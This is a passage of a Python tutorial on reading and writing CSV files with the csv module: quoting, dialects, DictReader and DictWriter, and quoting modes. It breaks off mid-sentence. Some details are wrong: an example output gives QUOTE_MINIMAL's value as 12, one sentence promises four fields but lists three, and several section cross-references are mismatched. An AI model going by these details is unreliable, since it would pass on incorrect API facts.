# CSV Files

## 1. Learning Objectives

By the end of this chapter you will be able to:

- Explain what CSV is, why it exists, and why it remains widely used
  despite its simplicity.
- Explain CSV's structure — rows, columns, fields, headers, records,
  and delimiters — and why CSV is fundamentally a *text* format with no
  built-in data types.
- Explain why naive `line.split(",")` parsing is unsafe, and what
  quoting, escaping, and embedded newlines actually require of a real
  parser.
- Use Python's `csv` module thoroughly: `csv.reader`, `csv.writer`,
  `csv.DictReader`, `csv.DictWriter`, and their important constructor
  parameters.
- Understand CSV dialects, quoting constants, and how to register and
  use a custom dialect.
- Use `csv.Sniffer` appropriately, and understand its limits.
- Handle CSV errors deliberately, using `csv.Error` and
  `csv.field_size_limit()`.
- Open CSV files with the correct `newline=""` and `encoding=` pattern,
  and explain why each matters specifically for CSV.
- Process very large CSV files without loading everything into memory.
- Validate CSV data at the boundary: required columns, types, missing
  values, duplicates, and malformed rows.
- Build CSV transformation pipelines that separate reading, validation,
  conversion, transformation, and writing.
- Recognize CSV injection (formula injection) and other CSV-specific
  security considerations.
- Explain where CSV fits — and does not fit — relative to JSON and
  databases, and where it appears in real data-engineering and AI/ML
  workflows.
- Write reusable, type-hinted CSV-processing functions, and test them
  with `pytest`'s `tmp_path`.
- Debug CSV problems systematically.
- Design a production-oriented CSV ingestion pipeline.

## 2. Why CSV Matters

Module 1.5's outcome is *"you can build reliable small tools that
process real files and communicate clearly through a CLI."*
[01-reading-and-writing-text-files.md](01-reading-and-writing-text-files.md)
taught you to read and write plain text; CSV is where that skill meets
**structured, tabular data** for the first time in this roadmap — and
it is, by a wide margin, the single most common format you will
encounter for exchanging tabular data between systems, teams, and
tools: spreadsheets export it, databases export it, APIs offer it,
data-science tools read and write it, and countless real pipelines
still move data as CSV between stages.

CSV also has a specific, important lesson to teach that goes beyond
syntax: **it looks deceptively simple, and that is exactly what makes
it dangerous.** A file that looks like "just commas and text" hides
real complexity — quoting, embedded delimiters, embedded newlines,
inconsistent row shapes, ambiguous missing-value conventions, and no
enforced types at all. Every one of this chapter's sections builds
toward one central engineering habit: **treat CSV, like any external
file, as untrusted input** — the same boundary-validation discipline
[01-reading-and-writing-text-files.md](01-reading-and-writing-text-files.md)'s
§3 introduced for file content in general now gets its most concrete,
practical workout.

This chapter assumes the file-I/O foundations from
[01-reading-and-writing-text-files.md](01-reading-and-writing-text-files.md)
(`open()`, encoding, context managers, exception handling) and the path
-handling foundations from
[02-pathlib-and-portable-paths.md](02-pathlib-and-portable-paths.md)
(`Path`, `.open()`) — it builds directly on both rather than repeating
them.

## 3. CSV Fundamentals

### 3.1 Structured and tabular data

**Structured data** is data organized according to a consistent,
predictable shape, rather than free-form text. **Tabular data**
specifically means data organized into rows and columns — exactly like
a spreadsheet, or a database table. CSV is one of the simplest possible
ways to represent tabular data as a plain text file.

### 3.2 A first example

```
name,age,city
Alice,30,London
Bob,25,Delhi
```

- **File** — the whole thing above, top to bottom.
- **Row** — one line, representing one entity: `Alice,30,London` is one
  row.
- **Field** — one single value within a row: `Alice`, `30`, and
  `London` are each a field of the second row.
- **Column** — all the fields in the same *position* across every row,
  taken together: every value in the "second position" (`age`, `30`,
  `25`) forms the `age` column.
- **Header** — an optional first row giving each column a name, rather
  than an anonymous position.
- **Record** — a term often used interchangeably with "row," especially
  when a header is present and each row represents one meaningful
  entity (one customer, one transaction, one event).

### 3.3 Why CSV became useful, and why it is still used

CSV requires no special software to create or read — any text editor
can produce it, and any spreadsheet program can open it. It is
**human-readable**, **simple to generate** from almost any programming
language, and **universally supported** — nearly every data tool,
database, and spreadsheet application can import and export it. This
combination of simplicity and near-universal support is precisely why,
decades after more sophisticated formats existed, CSV remains one of
the most common ways real systems exchange tabular data.

## 4. CSV as Text

### 4.1 The layered view

```
CSV file
    ↓
text (characters)
    ↓
delimiters and quoting rules applied
    ↓
rows and fields
```

A CSV file is, physically, nothing more than a text file
([01-reading-and-writing-text-files.md](01-reading-and-writing-text-files.md)'s
§5.2) — a sequence of characters. "Rows" and "fields" are not a
separate physical structure baked into the file; they are a
**convention**, reconstructed by a parser applying specific rules
(delimiters, §6; quoting, §7) to that plain sequence of characters.

### 4.2 CSV has no built-in data types

```python
import csv

with open("people.csv", "r", newline="", encoding="utf-8") as f:
    reader = csv.reader(f)
    next(reader)   # skip header
    for row in reader:
        print(row, type(row[1]))
```

```text
['Alice', '30', 'London'] <class 'str'>
['Bob', '25', 'Delhi'] <class 'str'>
```

**With the default `csv` reader behavior, every field is a plain
Python `str`** — `"30"` is text, not the integer `30`, until your own
code explicitly converts it. (A few reader configurations, such as
`quoting=csv.QUOTE_NONNUMERIC`, convert unquoted fields to `float`
automatically, but the CSV format itself never encodes types.) `"true"`, `"2026-09-21"`, and `"30.5"`
are, likewise, just characters — CSV itself has no concept of numbers,
booleans, or dates; it only has text. §9 and §24 make this explicit
conversion step a first-class part of this chapter, precisely because
skipping it is one of the most common sources of real bugs.

## 5. Rows, Columns, Fields, and Headers

### 5.1 Restating the vocabulary precisely

- **Row** — one line's worth of data, as a sequence of fields.
- **Column** — the set of fields occupying the same position across
  every row.
- **Field** — a single value, at the intersection of one row and one
  column.
- **Header row** — an optional first row naming each column; when
  present, it turns "the value in position 2" into "the value in the
  `age` column" — a distinction §13 (`csv.DictReader`) builds on
  directly.
- **Header-less CSV** — a perfectly valid, common CSV file with no
  header row at all — every row, including the first, is genuine data.
  Nothing about the CSV format itself signals whether a header is
  present; that knowledge has to come from *outside* the file (§17.3,
  §28).

### 5.2 CSV is more accurately "delimited text," not strictly comma-only

The name "CSV" (comma-separated values) suggests the comma is
essential — in practice, and in Python's own `csv` module, the
delimiter is configurable (§6), and the same row/field/header concepts
apply regardless of which character actually separates fields. "CSV"
is used, informally but very commonly, as an umbrella term for this
entire family of simple delimited tabular text formats — this chapter
uses the term the same informal way the field generally does, while
being precise about the underlying mechanics.

## 6. Delimiters

### 6.1 What a delimiter is

A **delimiter** is the character that separates one field from the
next within a row. The comma is the default and most common choice —
but it is a *choice*, not a requirement of the format's underlying
mechanics.

### 6.2 Common alternatives

```
name,age,city        <- comma
name;age;city         <- semicolon
name    age    city    <- tab ("TSV" -- tab-separated values)
name|age|city           <- pipe
```

### 6.3 Why some systems use semicolons

In many locales (much of continental Europe, for example), the comma
is already used as the *decimal separator* in numbers (`3,14` instead
of `3.14`) — using a comma as the field delimiter *too* would make
numeric fields ambiguous. Spreadsheet software configured for such a
locale commonly exports CSV using a **semicolon** delimiter instead,
specifically to avoid this collision.

### 6.4 Configuring the delimiter in Python

```python
import csv

with open("data.csv", "r", newline="", encoding="utf-8") as f:
    reader = csv.reader(f, delimiter=",")

with open("data_semicolon.csv", "r", newline="", encoding="utf-8") as f:
    reader = csv.reader(f, delimiter=";")
```

§11–§14 develop `csv.reader`/`csv.writer` fully; `delimiter=` is simply
one of the configurable parameters each accepts.

## 7. Quoting and Escaping

### 7.1 Why quoting is necessary

```
name,city
Alice,"New York, NY"
```

Without quoting, the comma *inside* `New York, NY` would be
indistinguishable from a genuine field-separating comma — a naive
parser would see four fields (`Alice`, `New York`, ` NY`) on that row
instead of the intended two. **Quoting** — wrapping a field in
`quotechar` (by default, `"`) — tells the parser "treat everything
between these quote characters as one single field, delimiters and
all."

### 7.2 What can appear safely inside a quoted field

```
name,notes
Alice,"Loves coffee, tea, and long walks"
Bob,"Says ""hello"" often"
Carol,"Lives at
123 Main St"
```

Commas, spaces, and other special characters (row 1); embedded double
quotes, when properly escaped (row 2, §7.3); and even literal newline
characters (row 3, §8) can all appear safely inside a correctly quoted
field.

### 7.3 Escaping embedded quotes: doubled quotes

```
name,comment
Alice,"She said ""hello"""
```

**What the parser actually sees, character by character, for Alice's
comment field:** the quoted field begins at the first `"`; each `""`
(two double-quote characters back to back) is interpreted as **one
literal `"` character** *within* the field, not as the field ending;
the field finally ends at the last, unpaired `"`. The resulting parsed
value is the string `She said "hello"` — a single field, with real
double quotes inside it.

### 7.4 `doublequote` vs. `escapechar`

```python
csv.reader(f, doublequote=True)                     # the default -- "" represents one literal quote
csv.reader(f, doublequote=False, escapechar="\\")     # an alternative -- \" represents one literal quote
```

`doublequote=True` (the default, and the overwhelmingly standard
convention, including in Excel-generated CSV) is what §7.3 just
demonstrated: a literal quote is written as two quote characters in a
row. `escapechar` is a **different, alternative convention** — a
dedicated escape character (commonly `\`) precedes a character that
would otherwise be interpreted specially, so `\"` means "a literal
quote character here," instead of `""`. **These are two different
conventions for the same underlying need** — a real CSV file follows
one or the other (very commonly doubled quotes), and your reader/writer
configuration must match whichever convention the actual data uses.

## 8. Newlines and Multiline Fields

### 8.1 A CSV field can legitimately contain a newline

```
id,comment
1,"Hello
World"
```

As long as the field is properly **quoted** (§7.1), a literal newline
character can appear *inside* it — this is completely valid CSV, and
represents exactly **one row**, with the `comment` field's value being
the two-line string `Hello\nWorld`.

### 8.2 Why naive line-by-line parsing breaks

```python
# BROKEN -- treats every physical text line as a separate CSV row
with open("data.csv", "r", encoding="utf-8") as f:
    for line in f:
        fields = line.split(",")
```

Given §8.1's example, this naive approach would incorrectly treat
`1,"Hello` as one "row" and `World"` as a second, completely separate
"row" — because it has no concept of "quoting" at all; it only knows
about individual text lines. **A correct CSV parser must track whether
it is currently *inside* an open quoted field, across physical line
boundaries, before deciding whether a newline character actually ends
a row.**

### 8.3 Why this means: never hand-roll CSV parsing

This single fact — that a "row," in CSV, is not the same thing as a
"physical line" of text — is the central, structural reason CSV cannot
be safely parsed with simple string operations. §9 makes this argument
completely concrete; Python's `csv` module (§10 onward) already
implements exactly this quote-aware logic correctly, which is precisely
why it exists.

## 9. Why Not `split(",")`?

### 9.1 The naive approach, and where it silently breaks

```python
line = 'Alice,"New York, NY",30\n'
fields = line.split(",")
print(fields)
```

```text
['Alice', '"New York', ' NY"', '30\n']
```

Four fields were produced from data that should have been exactly
three — the comma *inside* the quoted city name was treated identically
to a genuine delimiter, because `.split(",")` has no concept of
quoting whatsoever. Every one of §7's and §8's cases —
quoted fields containing the delimiter, escaped embedded quotes,
multiline quoted fields, and (relatedly) rows with genuinely missing
trailing fields — silently breaks `.split(",")`-based "parsing," often
*without* raising any error at all, which is what makes this class of
bug especially dangerous: the code runs, and produces subtly wrong
data, with no crash to alert you.

### 9.2 The `csv` module: parsing, not splitting

```python
import csv

with open("data.csv", "r", newline="", encoding="utf-8") as f:
    reader = csv.reader(f)
    for row in reader:
        print(row)
```

```text
['Alice', 'New York, NY', '30']
```

**The conceptual difference:** `.split(",")` is a pure, context-free
string operation — it has no memory of what came before, and no notion
of "am I currently inside quotes?" A real CSV **parser** (what
`csv.reader` implements) tracks state as it reads — whether it is
inside an open quoted field, whether the next character is an escaped
quote, whether a newline is a genuine row boundary or an embedded
character within a field — and only decides where one field or row
ends once that state makes it unambiguous. **The standing rule for this
entire chapter and beyond: never parse CSV with `.split(",")` or any
similar hand-rolled string manipulation — always use `csv.reader`,
`csv.DictReader`, or an equivalent, quote-aware parser.**

## 10. Data Types

### 10.1 Everything from CSV starts as `str`

Directly following from §4.2: every value your program receives from
`csv.reader`/`csv.DictReader` is a `str`. This is not a limitation to
work around occasionally — it is the format's fundamental nature, and
your code must explicitly decide, for every field, what type it should
actually become.

### 10.2 A demonstration of why this matters: `bool("false")`

```python
value = "false"
print(bool(value))
```

```text
True
```

This is not a bug in Python — `bool(some_non_empty_string)` is *always*
`True`, because any non-empty string is truthy
([Type Conversion and Truthiness](../02-Python-Core-Language-and-Data-Types/09-type-conversion-and-truthiness.md)).
`bool("false")` being `True` is a vivid, concrete demonstration of
exactly why **you must never blindly wrap a CSV field in `bool(...)`,
`int(...)`, or any other constructor and assume it "just works"** — §24
builds the correct, deliberate conversion functions this genuinely
requires.

### 10.3 The conversions this chapter will need

`int(value)` and `float(value)` for numbers (both raise `ValueError`
on non-numeric text — a signal to handle, not avoid); explicit,
deliberate string-to-boolean mapping (§24.3); date/datetime parsing via
`datetime.strptime()` (previewed in §24.4; full `datetime` treatment
belongs to
[Datetime, Timezones, and Timestamps](../09-Advanced-Production-Oriented-Python-Foundations/07-datetime-timezones-and-timestamps.md),
much later in the roadmap); and an explicit, application-defined
convention for "this field represents a missing value" (§23), since
CSV itself has no universal `null`.

## 11. Python `csv` Module

### 11.1 `import csv`

```python
import csv
```

### 11.2 Why the standard library provides this, and why you should use it

§9 already made the core argument: correctly parsing CSV requires
quote-aware, stateful logic that is genuinely easy to get subtly wrong
by hand. Python's `csv` module is a mature, thoroughly tested
implementation of exactly that logic, maintained as part of the
standard library — reimplementing it yourself would mean re-solving a
problem that is already correctly solved, with a high risk of missing
an edge case (embedded newlines, doubled quotes, unusual dialects) that
the standard module already handles.

### 11.3 The module's shape, at a glance

```
csv.reader / csv.writer          -- work with each row as a list of strings
csv.DictReader / csv.DictWriter    -- work with each row as a dictionary, keyed by header name
dialects                            -- named bundles of formatting rules (delimiter, quoting, ...)
csv.Sniffer                          -- heuristic format detection
csv.Error                             -- the module's own exception type
csv.field_size_limit()                 -- a safety limit on how large a single field may be
```

### 11.4 Internal mental model: what actually happens

```python
with open("data.csv", "r", newline="", encoding="utf-8") as f:
    reader = csv.DictReader(f)
    for row in reader:
        ...
```

```
file on disk
    ↓  (open(), newline="", encoding="utf-8" -- 01-reading-and-writing-text-files.md)
text stream (an ordinary Python file object)
    ↓  (csv.DictReader wraps the file object)
CSV parser (tracks quoting state, delimiter, dialect rules)
    ↓
rows, as lists of strings (csv.reader's own output)
    ↓  (DictReader additionally zips each row against the header)
dictionaries, one per row, keyed by column name
    ↓
your application's validation and business logic
```

The parser must understand quoting and delimiters specifically because,
as §8 and §9 demonstrated, the *text itself* does not unambiguously
reveal where one field or row ends without that context — the parser's
entire job is resolving that ambiguity correctly, using the dialect
rules (§15) you configure (or accept as defaults).

## 12. `csv.reader`

### 12.1 The simplest working example

```python
import csv

with open("data.csv", "r", newline="", encoding="utf-8") as f:
    reader = csv.reader(f)
    for row in reader:
        print(row)
```

```text
['name', 'age', 'city']
['Alice', '30', 'London']
['Bob', '25', 'Delhi']
```

**Line by line:** `open("data.csv", "r", newline="", encoding="utf-8")`
opens the file exactly as
[01-reading-and-writing-text-files.md](01-reading-and-writing-text-files.md)'s
§21 context-manager pattern already taught, with two CSV-specific
details explained fully in §26: `newline=""` and explicit `encoding=`.
`csv.reader(f)` wraps the already-open file object `f` in a CSV parser,
returning a **reader object** — note that `csv.reader` does **not**
take a file *path*; it takes an already-open, iterable text stream.
`for row in reader:` iterates the reader exactly like iterating a file
object for lines
([01-reading-and-writing-text-files.md](01-reading-and-writing-text-files.md)'s
§15) — each step produces the *next parsed row*, as a `list[str]`, one
entry per field. Note that the header row (`['name', 'age', 'city']`)
is returned like any other row — `csv.reader` has no built-in concept
of "the first row is special" at all (§17 develops exactly how to
handle this).

### 12.2 Iterator behavior and memory characteristics

A reader object is an **iterator** — it produces one row at a time, on
demand, as you iterate it, without reading or holding the entire file
in memory at once. This directly parallels
[01-reading-and-writing-text-files.md](01-reading-and-writing-text-files.md)'s
§15 lesson about `for line in f:` versus `f.readlines()` — §19 of this
chapter develops exactly why this laziness matters for large CSV files.

## 13. `csv.reader` Parameters

### 13.1 The full signature

```text
csv.reader(
    iterable,
    dialect='excel',
    *,
    delimiter=',',
    doublequote=True,
    escapechar=None,
    quotechar='"',
    quoting=csv.QUOTE_MINIMAL,
    skipinitialspace=False,
    strict=False,
)
```

### 13.2 Each parameter, explained

**`iterable`** — an already-open, line-iterable text stream (typically
a file object opened with `newline=""`, §26) — *not* a file path.
Example: `csv.reader(f)`. Common mistake: passing a path string
directly (`csv.reader("data.csv")`) — this iterates over the
*characters* of the path string itself, not the file's contents, and
fails confusingly rather than obviously.

**`dialect`** — a named bundle of the remaining formatting parameters
(§15); `'excel'` (the default) matches the conventions used by Excel's
own CSV export: comma delimiter, doubled-quote escaping,
`QUOTE_MINIMAL`. Example: `csv.reader(f, dialect="excel-tab")`.

**`delimiter`** — the field-separator character (§6). Example:
`csv.reader(f, delimiter=";")`. Common mistake: forgetting to change
this for a semicolon- or tab-separated file, silently producing rows
with one giant unsplit field each. Production implication: when the
delimiter is not known in advance, consider `csv.Sniffer` (§17) — but
validate its guess rather than trusting it blindly.

**`doublequote`** — whether `""` inside a quoted field represents one
literal `"` (§7.4). Example: `csv.reader(f, doublequote=False,
escapechar="\\")` for backslash-escaped data instead. Common mistake:
leaving this at the default `True` for data that actually uses
backslash-escaping, silently corrupting embedded-quote fields.

**`escapechar`** — the alternative escaping convention to `doublequote`
(§7.4); `None` by default (meaning: not used). Example:
`csv.reader(f, escapechar="\\")`.

**`quotechar`** — the character used to quote a field (§7.1); `'"'` by
default. Example: `csv.reader(f, quotechar="'")` for single-quoted
data. Production implication: must match whatever the *source* system
that generated the file actually used.

**`quoting`** — which quoting *mode* the reader should assume (§16
covers all four constants fully). Example:
`csv.reader(f, quoting=csv.QUOTE_NONE)`.

**`skipinitialspace`** — whether a space immediately following the
delimiter should be skipped before a field's value begins (§16.5).
Example: `csv.reader(f, skipinitialspace=True)` for
`"name, age, city"`-style data with a space after each comma.

**`strict`** — whether genuinely malformed CSV syntax should raise
`csv.Error` (`True`) or be tolerated permissively (`False`, the
default) (§18 covers this in full). Example:
`csv.reader(f, strict=True)`. Production implication: `strict=True` is
often the *right* default for ingestion pipelines that should reject
bad data loudly rather than silently guessing (§18.3, §32).

## 14. `csv.writer`

### 14.1 The simplest working example

```python
import csv

with open("output.csv", "w", newline="", encoding="utf-8") as f:
    writer = csv.writer(f)
    writer.writerow(["name", "age"])
    writer.writerow(["Alice", 30])
```

```text
name,age
Alice,30
```

**Line by line:** `open("output.csv", "w", newline="", encoding="utf-8")`
opens the destination file for writing, again with `newline=""` (§26).
`csv.writer(f)` wraps the file object in a **writer object**.
`writer.writerow([...])` writes exactly one row, converting every item
to its string representation automatically (`30`, an `int`, became the
text `30`) and inserting the configured delimiter and quoting as
needed. **`writer.writerow()`'s return value** is whatever the
underlying file object's own `write()` call returned (typically the
number of characters written) — most code, exactly like ordinary
`f.write()` (§17.1 of the previous chapter), ignores this return value.

### 14.2 `writerows()` — many rows at once

```python
with open("output.csv", "w", newline="", encoding="utf-8") as f:
    writer = csv.writer(f)
    writer.writerow(["name", "age"])
    writer.writerows([
        ["Alice", 30],
        ["Bob", 25],
    ])
```

`writerows()` accepts any iterable of rows and calls `writerow()`
internally for each — it does not require a pre-built list; a generator
works equally well, preserving §19's streaming approach on the write
side too.

## 15. `csv.writer` Parameters

### 15.1 The full signature

```text
csv.writer(
    fileobj,
    dialect='excel',
    *,
    delimiter=',',
    doublequote=True,
    escapechar=None,
    lineterminator='\r\n',
    quotechar='"',
    quoting=csv.QUOTE_MINIMAL,
    skipinitialspace=False,
    strict=False,
)
```

Every parameter shared with `csv.reader` (§13.2) means the same thing
here, on the writing side. `lineterminator` is new, and important
enough to deserve its own explanation.

### 15.2 `lineterminator`, and why it matters

**`lineterminator`** — the exact characters `csv.writer` writes at the
end of every row; **`'\r\n'` by default, regardless of which operating
system your code is running on.** This is a deliberate design choice —
`'\r\n'` matches the historical CSV convention used by Excel and many
other tools — but it interacts directly with §26's `newline=""`
requirement: without `newline=""`, Python's own text-mode newline
translation (already introduced conceptually in
[01-reading-and-writing-text-files.md](01-reading-and-writing-text-files.md)'s
§26.3) can *additionally* translate the `\n` half of `csv.writer`'s own
`\r\n`, on some platforms producing doubled `\r\r\n` line endings in
the actual output file. **This is exactly why `newline=""` is always
used when opening a file for `csv.writer` — it disables that separate
layer of translation, leaving `csv.writer` in full, correct control of
line endings on its own.**

## 16. `csv.DictReader`

### 16.1 The simplest working example

```python
import csv

with open("customers.csv", "r", newline="", encoding="utf-8") as f:
    reader = csv.DictReader(f)
    for row in reader:
        print(row["name"])
```

```text
Alice
Bob
```

`csv.DictReader` reads the **first row automatically as the header**
(by default), and every subsequent row is yielded as an
`OrderedDict`-like mapping (a plain `dict` in modern Python versions,
preserving insertion order) — `row["name"]` reaches directly for the
value under the `name` column, rather than requiring you to remember
that `name` happens to be at position `0`.

### 16.2 Why `DictReader` is often preferable to `reader`

Accessing `row["age"]` instead of `row[1]` is **dramatically more
readable and more robust**: it survives a column being reordered in
the source file, and it makes the intent of the code self-evident to
anyone reading it — `csv.reader`'s positional access requires the
reader to already know, and remember, exactly which position each
column occupies.

### 16.3 Missing and extra fields, previewed here, developed fully in §17

```python
# Header: name,age,city  -- but this row is short one field:
# Alice,30
```

`DictReader` handles rows that are shorter or longer than the header
gracefully rather than raising by default — §17.3 explains exactly what
value appears for a missing field, and where extra fields go.

## 17. `csv.DictReader` Parameters

### 17.1 The full signature

```python
csv.DictReader(
    f,
    fieldnames=None,
    restkey=None,
    restval=None,
    dialect='excel',
    *args,
    **kwds,
)
```

### 17.2 `fieldnames`

```python
# Header row automatically becomes the field names (the default, fieldnames=None):
reader = csv.DictReader(f)

# Explicitly supplied field names -- the file's first row is treated as ordinary DATA, not a header:
reader = csv.DictReader(f, fieldnames=["name", "age", "city"])
```

**When `fieldnames=None` (the default):** the first row read from `f`
is consumed and used as the header — it does **not** appear as a data
row in the resulting iteration. **When `fieldnames` is explicitly
supplied:** *every* row, including what would otherwise have been the
header row, is treated as genuine data — this is the correct choice for
header-less CSV files (§5.1), and a common mistake is forgetting to
supply it for such a file, causing the first *real* data row to be
silently swallowed as if it were a header.

### 17.3 `restkey` and `restval`

```python
# Header: name,age,city
# Row:    Alice,30,London,extra_value,another_extra

reader = csv.DictReader(f, restkey="extra_fields")
row = next(reader)
print(row)
```

```text
{'name': 'Alice', 'age': '30', 'city': 'London', 'extra_fields': ['extra_value', 'another_extra']}
```

**`restkey`** names the dictionary key under which any *extra* fields
(beyond what the header defines) are collected, as a `list` — `None`
by default, meaning extras are still collected, but stored under the
literal key `None` unless you name something more useful.

```python
# Header: name,age,city
# Row:    Bob,25          <-- missing the "city" field entirely

reader = csv.DictReader(f, restval="UNKNOWN")
row = next(reader)
print(row)
```

```text
{'name': 'Bob', 'age': '25', 'city': 'UNKNOWN'}
```

**`restval`** is the value used to fill in any column the header
defines but a given *short* row does not actually provide — `None` by
default.

### 17.4 Why this default, permissive behavior is a double-edged sword

`DictReader`'s default tolerance of ragged rows (§17.3) is convenient
for exploration, but **dangerous for production ingestion if left
unchecked** — a row silently missing a required field becomes `None`
rather than raising an error, and a row with unexpected extra data is
silently collected under `restkey` (or the bare key `None`) rather than
flagged. §21 and §32 build explicit validation specifically to catch
what `DictReader` itself will otherwise pass through quietly.

## 18. `csv.DictWriter`

### 18.1 The simplest working example

```python
import csv

fieldnames = ["name", "age"]

with open("people.csv", "w", newline="", encoding="utf-8") as f:
    writer = csv.DictWriter(f, fieldnames=fieldnames)
    writer.writeheader()
    writer.writerow({"name": "Alice", "age": 30})
```

```text
name,age
Alice,30
```

`fieldnames` is **required** (unlike `DictReader`'s optional version)
— `DictWriter` has no file to read a header from; you must tell it,
explicitly, which columns exist and in what order. `writeheader()`
writes exactly one row containing the field names themselves — a
separate, deliberate call, not something `writerow()` does
automatically. `writerow({...})` accepts a dictionary; **its keys must
correspond to `fieldnames`**, and values are written in the *order
`fieldnames` specifies*, regardless of the dictionary's own internal
key order.

### 18.2 `writerows()`

```python
writer.writerows([
    {"name": "Alice", "age": 30},
    {"name": "Bob", "age": 25},
])
```

## 19. `csv.DictWriter` Parameters

### 19.1 The full signature

```python
csv.DictWriter(
    f,
    fieldnames,
    restval="",
    extrasaction="raise",
    dialect="excel",
    *args,
    **kwds,
)
```

Every dialect-related keyword also available to `csv.writer` (§15.1)
— `delimiter`, `quotechar`, `quoting`, `lineterminator`, `escapechar`,
`doublequote`, `skipinitialspace` — is likewise accepted here.

### 19.2 `restval` — filling in missing dictionary keys on write

```python
fieldnames = ["name", "age", "city"]

with open("people.csv", "w", newline="", encoding="utf-8") as f:
    writer = csv.DictWriter(f, fieldnames=fieldnames, restval="N/A")
    writer.writeheader()
    writer.writerow({"name": "Alice", "age": 30})   # "city" missing from this dict
```

```text
name,age,city
Alice,30,N/A
```

`restval` (`""` by default) is what gets written for any `fieldnames`
column a given row's dictionary simply does not include a key for.

### 19.3 `extrasaction` — `"raise"` vs. `"ignore"`

```python
fieldnames = ["name", "age"]

writer = csv.DictWriter(f, fieldnames=fieldnames, extrasaction="raise")   # the default
writer.writerow({"name": "Alice", "age": 30, "city": "London"})            # "city" is NOT in fieldnames
```

```text
Traceback (most recent call last):
  ...
ValueError: dict contains fields not in fieldnames: 'city'
```

```python
writer = csv.DictWriter(f, fieldnames=fieldnames, extrasaction="ignore")
writer.writerow({"name": "Alice", "age": 30, "city": "London"})            # succeeds; "city" is silently dropped
```

**Why the default (`"raise"`) is almost always the right choice:**
`extrasaction="ignore"` means **silent data loss** — the `city` value
was computed, or read from somewhere, and is simply thrown away with no
warning whatsoever. Choosing `"ignore"` should be a **deliberate,
documented decision** for a specific, known reason (e.g. intentionally
projecting a wider internal representation down to a narrower output
schema) — never a default reached for to make an inconvenient error
disappear.

## 20. Dialects

### 20.1 What a dialect is, and why it exists

A **dialect** is a named, reusable bundle of the formatting parameters
§13 and §15 introduced individually (`delimiter`, `quotechar`,
`doublequote`, `escapechar`, `lineterminator`, `quoting`,
`skipinitialspace`, `strict`) — instead of repeating the same eight
keyword arguments at every single `csv.reader`/`csv.writer` call
throughout a program, you define (or reuse) one dialect, once, and
refer to it by name.

### 20.2 Built-in dialects

```python
import csv

print(csv.list_dialects())
```

```text
['excel', 'excel-tab', 'unix']
```

- **`'excel'`** (the default for every reader/writer/DictReader/
  DictWriter shown so far) — comma-delimited, doubled-quote escaping,
  `\r\n` line terminator, `QUOTE_MINIMAL` — matching Excel's own CSV
  export conventions.
- **`'excel-tab'`** — identical to `'excel'`, except tab-delimited.
- **`'unix'`** — comma-delimited, but with `\n` line termination and
  `QUOTE_ALL` — matching Unix text-file conventions more closely.

### 20.3 `csv.get_dialect()` and inspecting one

```python
dialect = csv.get_dialect("excel")
print(dialect.delimiter, repr(dialect.lineterminator), dialect.quoting)
```

```text
, '\r\n' 12
```

(`12` is simply `csv.QUOTE_MINIMAL`'s underlying integer value — §22
explains the quoting constants properly.)

### 20.4 Registering a custom dialect

```python
csv.register_dialect(
    "pipe_dialect",
    delimiter="|",
    quotechar="'",
    doublequote=True,
    lineterminator="\n",
)

with open("data.psv", "r", newline="", encoding="utf-8") as f:
    reader = csv.reader(f, dialect="pipe_dialect")
```

`csv.register_dialect(name, dialect=None, **fmtparams)` gives a name to
a specific combination of settings, once — reused by name in every
reader/writer call afterward, keeping formatting configuration in
exactly one place instead of duplicated at every call site.

### 20.5 `csv.unregister_dialect()`

```python
csv.unregister_dialect("pipe_dialect")
```

Removes a previously registered dialect by name; attempting to use an
unregistered name afterward raises `csv.Error`.

### 20.6 When a custom dialect is genuinely useful

When a single program repeatedly reads or writes the same
non-default format (a specific partner's pipe-delimited export, for
example) throughout many different functions or modules — defining
the dialect once, centrally, avoids the same eight parameters being
copy-pasted (and potentially drifting out of sync) at every call site.

## 21. Dialect API

### 21.1 `csv.Dialect` — the base class

```text
class csv.Dialect
```

`csv.Dialect` is the base class every dialect (built-in or custom)
conceptually derives from — it exists primarily to document, in one
place, the full set of formatting attributes a dialect provides:
`delimiter`, `quotechar`, `escapechar`, `doublequote`,
`skipinitialspace`, `lineterminator`, `quoting`, `strict` — exactly the
same set of parameters §13 and §15 already covered individually, now
understood as *one bundled object* rather than eight separate keyword
arguments.

### 21.2 Subclassing, as an alternative to `register_dialect`

```python
class PipeDialect(csv.Dialect):
    delimiter = "|"
    quotechar = "'"
    doublequote = True
    lineterminator = "\n"
    quoting = csv.QUOTE_MINIMAL

csv.register_dialect("pipe_dialect", PipeDialect)
```

Defining a dialect as a genuine class (rather than passing individual
`fmtparams` keywords directly to `register_dialect`, as §20.4 did) is
functionally equivalent, and is sometimes preferred purely for
readability — the full list of settings is visible together, as class
attributes, in one place.

### 21.3 Retrieving and listing dialects, restated

`csv.get_dialect(name)` retrieves a registered dialect object by name
(raising `csv.Error` if unregistered); `csv.list_dialects()` lists
every currently registered dialect's name, including the three
built-ins (§20.2).

## 22. Quoting Modes

### 22.1 `csv.QUOTE_MINIMAL` — the default

```python
writer = csv.writer(f, quoting=csv.QUOTE_MINIMAL)
writer.writerow(["Alice", "New York, NY", "30"])
```

```text
Alice,"New York, NY",30
```

**Behavior:** only quote a field if it actually *needs* it — because it
contains the delimiter, the quote character itself, or a character from
`lineterminator`. **Practical use case:** the sensible general-purpose
default — minimal, readable output, while remaining fully correct.
**Caveat:** on *reading*, `QUOTE_MINIMAL` (as a reader setting) does not
convert anything to a non-string type — every field, quoted or not,
still comes back as `str` (§10).

### 22.2 `csv.QUOTE_ALL`

```python
writer = csv.writer(f, quoting=csv.QUOTE_ALL)
writer.writerow(["Alice", "30", "London"])
```

```text
"Alice","30","London"
```

**Behavior:** quote absolutely every field, whether it strictly needs
it or not. **Practical use case:** maximum explicitness/unambiguity —
useful when the consuming system is known to be picky, or when every
field's boundaries being visually and structurally explicit is
genuinely valuable. **Caveat:** noticeably larger output files, with no
functional benefit over `QUOTE_MINIMAL` for correctly-quoting-aware
readers.

### 22.3 `csv.QUOTE_NONNUMERIC`

```python
writer = csv.writer(f, quoting=csv.QUOTE_NONNUMERIC)
writer.writerow(["Alice", 30, 5.5])
```

```text
"Alice",30,5.5
```

**Behavior on write:** quote every field that is not already a `float`
or `int` (so `"Alice"` gets quoted; `30` and `5.5`, passed as actual
numeric types, do not). **Behavior on read — the important, easily
missed part:** when used with a *reader*, `QUOTE_NONNUMERIC`
automatically converts every **unquoted** field to `float` — this is a
genuine, automatic type conversion, unlike every other quoting mode.
**Practical use case:** a convenient shortcut when a file's numeric
columns are reliably unquoted and you want them as `float` directly,
without a separate manual conversion step. **Caveat:** every converted
